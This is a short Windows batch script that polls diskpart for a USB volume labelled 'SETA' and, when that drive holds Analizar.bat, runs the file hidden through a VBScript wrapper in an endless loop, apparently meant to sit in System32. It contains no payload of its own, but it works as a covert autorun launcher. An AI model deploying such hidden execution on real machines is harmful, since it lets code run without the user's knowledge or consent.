REM *** %WINDIR%/SYSTEM32 ***
:WHILE
for /f "tokens=3 delims= " %%A in ('ECHO list volume ^| diskpart ^| findstr "SETA"') do (set USBDrive=%%A:)
if [%USBDrive%] EQU [] (
TIMEOUT /T 3
GOTO :WHILE ) else if exist %USBDrive%\Analizar.bat (
GOTO :BREAK) ELSE (
TIMEOUT /t 3
SET USBDrive=
GOTO :WHILE)

:BREAK
wscript.exe Ocultar.vbs %USBDrive%\Analizar.bat

TIMEOUT /t 90
SET USBDrive=
GOTO :WHILE